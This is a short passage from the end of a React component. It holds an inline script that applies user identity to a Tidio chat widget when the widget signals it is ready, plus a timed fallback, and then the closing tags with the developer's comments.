            console.log("Identity applied.");
          }

          document.addEventListener("tidioChat-ready", applyIdentity);

          // Extra fallback — apply again after 3 seconds
          setTimeout(applyIdentity, 3000);
        `
      }}
    ></script>
  </>
)}

    </div> 
  ); // ← THIS closes the return properly!
} // ← THIS closes the component properly
